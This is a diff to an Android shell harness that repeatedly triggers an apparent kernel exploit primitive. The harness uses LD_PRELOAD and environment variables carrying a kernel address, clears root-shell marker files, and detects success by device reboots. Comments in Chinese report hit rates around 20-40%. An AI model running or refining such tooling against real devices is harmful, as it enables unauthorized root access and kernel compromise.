@@ -30,18 +30,23 @@ rm -f /data/local/tmp/root_marker.txt /data/local/tmp/root_shell.txt
 echo "start $(date +%H:%M:%S) boot_before=$BID0 enforce=$(getenforce)" > $LOG
 am kill-all 2>&1 | tail -1 >> $LOG
 
-echo "=== R0: liveness oracle ===" >> $LOG
-rm -f $RUNLOG
-timeout 120 env \
-  PSELECT_SLIDE_TRIGGER=1 \
-  PSELECT_RETRY=1 \
-  PSELECT_TREE_PC=ffffff8002a60bb0 \
-  PSELECT_TREE_LEFT=0 \
-  LD_PRELOAD=$DST /system/bin/sleep 70 > $RUNLOG 2>&1
-BID=$(cat /proc/sys/kernel/random/boot_id)
-echo "R0 rc=$? boot_id=$BID" >> $LOG
-if [ "$BID" = "$BID0" ]; then
-  echo "!! R0: 原语未激活 — 直接换 boot 重跑, 后续 8 轮别浪费" >> $LOG
+echo "=== R0: liveness oracle (mt47c: 3轮判活, 单轮命中率~20-40% per mt25 历史) ===" >> $LOG
+R0OK=0
+for R0N in 1 2 3; do
+  rm -f $RUNLOG
+  timeout 120 env \
+    PSELECT_SLIDE_TRIGGER=1 \
+    PSELECT_RETRY=1 \
+    PSELECT_TREE_PC=ffffff8002a60bb0 \
+    PSELECT_TREE_LEFT=0 \
+    LD_PRELOAD=$DST /system/bin/sleep 70 > $RUNLOG 2>&1
+  BID=$(cat /proc/sys/kernel/random/boot_id)
+  echo "R0 round=$R0N rc=$? boot_id=$BID" >> $LOG
+  if [ "$BID" != "$BID0" ]; then R0OK=1; echo "R0: ALIVE (round=$R0N)" >> $LOG; break; fi
+  sleep 3
+done
+if [ $R0OK -eq 0 ]; then
+  echo "!! R0: 3轮全灭 — 原语未激活, 换 boot 重跑" >> $LOG
   exit 1
 fi
 sleep 3
